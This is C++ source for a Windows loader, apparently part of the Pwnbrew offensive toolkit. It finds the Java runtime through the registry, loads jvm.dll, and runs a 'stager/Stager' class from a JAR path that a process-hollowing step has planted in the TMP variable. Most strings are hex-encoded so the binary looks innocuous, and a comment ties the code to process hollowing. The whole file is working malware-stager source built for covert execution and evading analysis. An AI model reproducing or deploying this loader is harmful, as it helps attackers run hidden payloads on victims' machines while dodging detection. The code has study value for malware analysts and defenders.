//***************************************************************
/*  Author: Securifera
/   Description: 
/           This application sets up and runs the java application
/   as a service.
/
/   Revision History:
/           Fixed bug that was causing the service to close on 
/                logoff.  Added -Xrs option to jvm startup arguments.
*/
//****************************************************************

#include "jarldr.h"
#include "..\log.h"
#include "..\utilities.h"


#pragma comment(lib, "Advapi32.lib")

//JVM DLL instance
HINSTANCE hDllInstance;
JavaVM *vm;


int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{

	//TMP
	char *tmp_ptr = decode_split("\x5\x4\x4\xd\x5\x0",6);
	//TEMP
	char *temp_ptr = decode_split("\x5\x4\x4\x5\x4\xd\x5\x0",8);

	size_t len;
	//Get TEMP env
	char * temp_env = nullptr;
	_dupenv_s (&temp_env, &len, temp_ptr);
	
	//Get TMP env - this is the one we set in proc hollow
	char * tmp_env = nullptr;
	_dupenv_s (&tmp_env, &len, tmp_ptr);
	if( tmp_env && strlen(tmp_env) > 0 ){

#ifdef _DBG
		Log( "Path: %s\n", tmp_env);
#endif

		//Reset
		if( temp_env && (strcmp(tmp_env, temp_env) != 0)  ){		
			//Set TMP back to TEMP
			SetEnvironmentVariable(tmp_ptr, temp_env);
			
		} else {
			//Reset TMP var
			SetEnvironmentVariable(tmp_ptr, "");
		}
	}

	//Free memory
	free(temp_ptr);
	free(tmp_ptr);
	if( temp_env )
		free(temp_env);

	std::string jarPath(tmp_env);
	free(tmp_env);
	
    //jarPath.assign("C:\\Pwnbrew\\Loader\\Windows\\Stager.jar");
	InvokeMain( nullptr, jarPath);
}


////=========================================================================
///**
//	Gets the installed java version
//*/
//void GetJavaVersion(std::string& sJavaVersion){
//	char   psBuffer[128];
//	std::string javaVersionArray[5];
//	FILE   *pPipe;
//
//	/* Run DIR so that it writes its output to a pipe. Open this
//	* pipe with read text attribute so that we can read it 
//	* like a text file. 
//	*/
//    //java -version 2>&1
//	char *ver_str = decode_split("\x6\xa\x6\x1\x7\x6\x6\x1\x2\x0\x2\xd\x7\x6\x6\x5\x7\x2\x7\x3\x6\x9\x6\xf\x6\xe\x2\x0\x3\x2\x3\xe\x2\x6\x3\x1",36);
//	if( (pPipe = _popen( ver_str, "rt" )) == NULL ){
//		free(ver_str);
//		exit( 1 );
//	}
//	//free mem
//	free(ver_str);
//
//	/* Read pipe until end of file, or an error occurs. */
//	int i = 0;
//	while(fgets(psBuffer, 128, pPipe)){
//		javaVersionArray[i] = std::string(psBuffer);
//		i++;
//	}
//
//	/* Close pipe and print return value of pPipe. */
//	if (feof(pPipe))
//		_pclose( pPipe) ;
//#ifdef _DBG
//	else
//		Log( "Error: Failed to read the pipe to the end.\n");
//#endif
//
//	//Parse out the version
//	int firstQuote  = (int)javaVersionArray[0].find_first_of("\"");
//	int secondQuote = (int)javaVersionArray[0].find_last_of("\"");
//
//	sJavaVersion = javaVersionArray[0].substr(firstQuote + 1, (secondQuote - firstQuote) - 1);
//
//
//}

//*****************************************
/*
*  Get the path to the JVM. Returns null if it's not found
*  Requires memory cleanup if buffer is returned.
*/
char *GetJvmPath(){

	char *ret_path = nullptr;

	//Check registry first
	//SOFTWARE\JavaSoft\Java Runtime Environment
	char *key_str = "SOFTWARE\\JavaSoft\\Java Runtime Environment";
	HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, key_str, 0, KEY_READ, &hKey) == ERROR_SUCCESS){

		DWORD type;
		DWORD length = MAX_PATH;
		char buf[MAX_PATH];
		memset(buf,0, MAX_PATH);

		//Get current version
		//CurrentVersion
		char *name = "CurrentVersion";
		if (RegQueryValueEx(hKey, name, NULL, &type, (LPBYTE)buf, &length) == ERROR_SUCCESS){
			//If the return type is a string
			if (type == REG_SZ && length > 0){

				//Add the current version and attempt to get JVM path
				std::string cur_ver_key(key_str);
				cur_ver_key.append("\\").append(buf);

				//Close previous key
				RegCloseKey(hKey);

				//Open new key
				if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, cur_ver_key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS){

					length = MAX_PATH;
					memset(buf,0, MAX_PATH);

					//Get current version
					//CurrentVersion
					name = "RuntimeLib";
					if (RegQueryValueEx(hKey, name, NULL, &type, (LPBYTE)buf, &length) == ERROR_SUCCESS){
						//If the return type is a string
						if (type == REG_SZ && length > 0){
							ret_path = (char *)calloc(length, 1);
							memcpy(ret_path, buf, length);
						}
					}
				}
			}
		}
	}

	return ret_path;
}

//Load JVM and if it fails load microsoft runtime first
bool LoadJvmLibrary(char *jvm_path){

	std::string sJavaDll;
	std::string sLibPath;

	 //Set the dir
	SetCurrentDirectory(jvm_path);
		
	//Close the file handle
	hDllInstance = LoadLibrary(jvm_path);

	//If didn't load, try to load msvcr100 first
	if(hDllInstance == NULL){

		//systemroot
		char *root = decode_split("\x7\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x7\x2\x6\xf\x6\xf\x7\x4",20);

		char * pSystemRoot = nullptr;
		size_t len;
		_dupenv_s (&pSystemRoot, &len, root );
		free(root);
			
		//Check if default path exists
		char *mscrt = decode_split("\x5\xc\x5\xc\x6\xd\x7\x3\x7\x6\x6\x3\x7\x2\x3\x1\x3\x0\x2\xe\x6\x4\x6\xc\x6\xc",26);
		sLibPath.assign(pSystemRoot).append(mscrt);
		free(mscrt);
	    if( FileExists(sLibPath)){ 

			hDllInstance = LoadLibrary(sLibPath.c_str());
			
			//Try and load the jvm dll again
			if(hDllInstance != NULL){
			    hDllInstance = LoadLibrary( jvm_path );
			} else {

#ifdef _DBG
			   	//Write error log
				std::string sFailed = std::string("Failed to load C++ Runtime, Path: ");
				sFailed.append(sLibPath).append("\n");
				Log((char *)sFailed.c_str());
#endif

				return FALSE;
			}
		} 
	}
			
	return (hDllInstance != NULL);

}

//=========================================================================
/**
	Main Java Entry Point
*/
BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath ) {
	JavaVMInitArgs vm_args;
	JavaVMOption options[2];
	jint res;
	JNIEnv *env;
	jclass cls;
	jmethodID mid;
	jclass stringClass;
    jobjectArray args;
	jstring jstr;
	
	std::string sJavaVersion, sJavaRoot;
	char* jvmPath = GetJvmPath();
	if( jvmPath == nullptr ){
#ifdef _DBG
		//Print the last error
		Log("Unable to find java runtime DLL path.\n", GetLastError());					
#endif
		return FALSE;
	}

	//boolean libraryFound = LoadJava();

	//GetJavaVersion(sJavaVersion);
	//bool libraryFound =PrepareJava(sJavaVersion, sJavaRoot);
		  
	
	//If the file couldn't be found or loaded
	if( !LoadJvmLibrary( jvmPath ) ) {

#ifdef _DBG
		std::string sFailed("Failed to Load JVM DLL, Path: ");
		sFailed.append(jvmPath).append("\n");
		//Log
		Log((char *)sFailed.c_str());
		Log("Error code = %d\n", GetLastError());					
#endif
				
		//Free memory
		free(jvmPath);
		return FALSE;	
	}
		
	//Free memory
	free(jvmPath);
		
	//resolve the function pointer JNI_CreateJVM
	//JNI_CreateJavaVM string
	char *create_jvm_str = decode_split("\x4\xa\x4\xe\x4\x9\x5\xf\x4\x3\x7\x2\x6\x5\x6\x1\x7\x4\x6\x5\x4\xa\x6\x1\x7\x6\x6\x1\x5\x6\x4\xd",32);
	CreateJavaVM createJVM = (CreateJavaVM)GetProcAddress(hDllInstance, create_jvm_str);
	free(create_jvm_str);
	
	//-Djava.class.path=
	char *class_path = decode_split("\x2\xd\x4\x4\x6\xa\x6\x1\x7\x6\x6\x1\x2\xe\x6\x3\x6\xc\x6\x1\x7\x3\x7\x3\x2\xe\x7\x0\x6\x1\x7\x4\x6\x8\x3\xd",36);
	std::string classPath(class_path);
	free(class_path);	
	classPath.append(adsPath);
	
	//-Xrs
	char *ignore_sig = decode_split("\x2\xd\x5\x8\x7\x2\x7\x3",8);
	options[0].optionString = const_cast<char*>(classPath.c_str()); // application class path 
	options[1].optionString = ignore_sig; // ignore os signals
	
	vm_args.version = JNI_VERSION_1_4; //JNI Version 1.4 and above
	vm_args.options = options;
	vm_args.nOptions = 2;
	vm_args.ignoreUnrecognized = JNI_FALSE;

	//Create the JVM
	res = createJVM(&vm, (void **)&env, &vm_args);
	free(ignore_sig);
	if (res < 0)  {
#ifdef _DBG
		Log( "Error creating JVM\n");
#endif
		return FALSE;
	}

	//Find the java class
	//stager/Stager
	char *start_class = decode_split("\x7\x3\x7\x4\x6\x1\x6\x7\x6\x5\x7\x2\x2\xf\x5\x3\x7\x4\x6\x1\x6\x7\x6\x5\x7\x2",26);
    cls = env->FindClass(start_class);
	free(start_class);

	// invoke the main method
	//([Ljava/lang/String;)V
	char *java_str = decode_split("\x2\x8\x5\xb\x4\xc\x6\xa\x6\x1\x7\x6\x6\x1\x2\xf\x6\xc\x6\x1\x6\xe\x6\x7\x2\xf\x5\x3\x7\x4\x7\x2\x6\x9\x6\xe\x6\x7\x3\xb\x2\x9\x5\x6",44);
    //main
	char *main_str = decode_split("\x6\xd\x6\x1\x6\x9\x6\xe",8);
	mid = env->GetStaticMethodID(cls, main_str, java_str);
	free(java_str);
	free(main_str);

    //Set arguments
	std::string arg1;
	if(serviceName != nullptr)
		arg1.assign(*serviceName);

	jstr = env->NewStringUTF(arg1.c_str());
    if (jstr == NULL) {
#ifdef _DBG
		Log( "Unable to create string\n");
#endif
        return FALSE;
    }

	//java/lang/String
	char *str_param = decode_split("\x6\xa\x6\x1\x7\x6\x6\x1\x2\xf\x6\xc\x6\x1\x6\xe\x6\x7\x2\xf\x5\x3\x7\x4\x7\x2\x6\x9\x6\xe\x6\x7",32);
    stringClass = env->FindClass(str_param);
    args = env->NewObjectArray(1, stringClass, env->NewStringUTF(""));
	env->SetObjectArrayElement(args,0,jstr);

    env->CallStaticVoidMethod(cls, mid, args);
	
	//if there is any exception log
	if(env->ExceptionCheck()) {

#ifdef _DBG
		Log( "Exception occured..\n");
		env->ExceptionDescribe();
#endif
		return FALSE;
	} 

	vm->DestroyJavaVM();
	
	return TRUE;
}

//=========================================================================
/**
	Shutdown method
*/
VOID WINAPI InvokeShutdown() {
    JNIEnv *env;
	
	//Since the JVM was created in a another thread. We have to attach the thread 
	//to JVM before making JVM calls
	vm->AttachCurrentThread((void **)&env, 0); 
	vm->DestroyJavaVM();
	vm->DetachCurrentThread();
}


////=========================================================================
///**
//	Attempts to find the java install
//*/
//BOOL PrepareJava(std::string pJavaVersion, std::string& sJavaPath ){
//    
//	WIN32_FIND_DATA fdata;
//    HANDLE found;
//	std::string fileName;
//	std::string javaVersionInt;
//	std::string genericRuntime;
//	std::string genericRuntime2;
//	boolean foundJava = false;
//	
//	int firstPeriod  = (int)pJavaVersion.find_first_of(".");
//		
//	char *jre_str = decode_split("\x6\xa\x7\x2\x6\x5",6);
//	//Get the java version
//	if( firstPeriod != std::string::npos ) {	
//		javaVersionInt.assign(pJavaVersion.substr(firstPeriod + 1, 1)); 
//		genericRuntime.append(jre_str).append(javaVersionInt);
//	} else {
//		genericRuntime.append(jre_str);
//	}
//
//	//Set to runtime 7
//	genericRuntime2.append(jre_str).append("7");	
//
//	std::string javaPath(JAVADIR);
//    //Set to x86 dir if 64bit since we are x86
//	if( IsWow64() && FileExists(JAVADIR_X64)){
//		javaPath = JAVADIR_X64;
//	}
//	
//	char *jdk_str = decode_split("\x6\xa\x6\x4\x6\xb",6);
//	//Check if default path exists
//	if(!foundJava){
//	
//		//Find Image Files
//		if(SetCurrentDirectory(javaPath.c_str())){
//
//			found = FindFirstFile("*",&fdata);
//			if (found != INVALID_HANDLE_VALUE)
//			{
//				do
//				{
//					if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
//						if(strstr(fdata.cFileName,pJavaVersion.c_str()) != NULL){
//							fileName = std::string(fdata.cFileName);
//						
//							//If the path is a jdk instead of a jre then append the correct path
//							if(javaPath.find(jdk_str) == std::string::npos){
//							   javaPath.append("\\").append(fdata.cFileName).append("\\").append(jre_str);
//							} else {
//							   javaPath.append("\\").append(fdata.cFileName);
//							}
//
//							sJavaPath.assign(javaPath);
//						
//							//Ensure file exists
//							foundJava=true;							
//							break;
//
//						} else if(strcmp(genericRuntime.c_str(), fdata.cFileName) == 0){
//						   
//							javaPath.append("\\").append(fdata.cFileName);
//							sJavaPath.assign(javaPath);
//							
//							foundJava=true;
//							break;
//
//						} else if(strcmp(genericRuntime2.c_str(), fdata.cFileName) == 0){
//						   
//							javaPath.append("\\").append(fdata.cFileName);
//							sJavaPath.assign(javaPath);
//							
//							foundJava=true;
//							break;
//
//						}
//					}
//					else
//						continue;
//				}
//				while (FindNextFile(found, &fdata));
//
//				FindClose(found);
//			}
//		}
//
//
//#ifdef _DBG
//		Log((char *)javaPath.c_str());
//#endif
//
//		sJavaPath = javaPath;
//		
//		//If we found a java path then load it
//		if(foundJava){
//		   foundJava = LoadJava(sJavaPath);	 
//		}
//    }
//
//	//free mem
//	free(jre_str);
//	free(jdk_str);
//
//	return foundJava;
//}

////=========================================================================
///**
//	Loads java
//*/
//BOOL LoadJava(std::string sJavaPath){
//    
//	std::string sJavaDll;
//	std::string sLibPath;
//
//	//Load the JVM Dll
//	sJavaDll.assign(sJavaPath).append(JVM_CLIENT_PATH).append(JVM_NAME);
//		
//	//Check if client path exists
//	if( !FileExists(sJavaDll)){ 
//		
//		//Close and try the server path
//		sJavaDll.assign(sJavaPath).append(JVM_SERVER_PATH).append(JVM_NAME);
//		if( !FileExists(sJavaDll)){ 
//
//#ifdef _DBG
//			//Write error log
//			std::string sFailed = std::string("Failed to find jvm dll, Path: ");
//			sFailed.append(sJavaDll).append("\n");
//			Log((char *)sFailed.c_str());
//#endif
//
//			return FALSE;
//		}
//	}
//
//    //Set the dir
//	SetCurrentDirectory(sJavaDll.c_str());
//		
//	//Close the file handle
//	hDllInstance = LoadLibrary(sJavaDll.c_str());
//
//	//If didn't load, try to load msvcr100 first
//	if(hDllInstance == NULL){
//
//		//systemroot
//		char *root = decode_split("\x7\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x7\x2\x6\xf\x6\xf\x7\x4",20);
//
//		char * pSystemRoot = nullptr;
//		size_t len;
//		_dupenv_s (&pSystemRoot, &len, root );
//		free(root);
//			
//		//Check if default path exists
//		sLibPath.assign(pSystemRoot).append(MSVCR_PATH);
//	    if( FileExists(sLibPath)){ 
//
//			hDllInstance = LoadLibrary(sLibPath.c_str());
//			
//			//Try and load the jvm dll again
//			if(hDllInstance != NULL){
//			    hDllInstance = LoadLibrary(sJavaDll.c_str());
//			} else {
//
//#ifdef _DBG
//			   	//Write error log
//				std::string sFailed = std::string("Failed to load C++ Runtime, Path: ");
//				sFailed.append(sJavaPath).append("\n");
//				Log((char *)sFailed.c_str());
//#endif
//
//				return FALSE;
//			}
//		} 
//	}
//			
//	return (hDllInstance != NULL);
//
//}

//Returns whether a file exists
BOOL FileExists(std::string thePath){
	return GetFileAttributes(thePath.c_str()) != INVALID_FILE_ATTRIBUTES;
}
